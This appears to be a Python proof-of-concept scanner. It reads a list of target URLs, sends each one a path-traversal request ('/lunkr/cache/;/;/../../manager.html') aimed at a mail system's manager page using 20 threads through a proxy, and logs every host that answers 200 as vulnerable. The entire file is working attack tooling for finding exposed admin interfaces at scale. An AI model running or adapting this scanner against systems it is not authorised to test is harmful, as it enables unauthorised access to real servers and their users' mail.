# -*- Coding: utf-8 -*-

import requests
import threadpool
import re
from bs4 import BeautifulSoup
import os

proxies= {'http':'http://127.0.0.1:10808'}
requests.packages.urllib3.disable_warnings()
header = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',

}

def mailsmsPoC(url):
    url = url + '/lunkr/cache/;/;/../../manager.html'
    try:
        r = requests.get(url,headers=header,verify=False,proxies=proxies,timeout=5)
        if r.status_code == 200:
            with open('target.txt', 'a+') as f:
                f.write(url + '\n')
            print(url)
        else:
            print("mailsms is safe!")
    except Exception as e:
        print(e)


def pool():
    with open('cg.txt', 'r') as f:
        lines = f.read().splitlines()
        task_pool = threadpool.ThreadPool(20)
        requests = threadpool.makeRequests(mailsmsPoC, lines)
    for req in requests:
        task_pool.putRequest(req)
        task_pool.wait()


if __name__ == '__main__':
    pool()







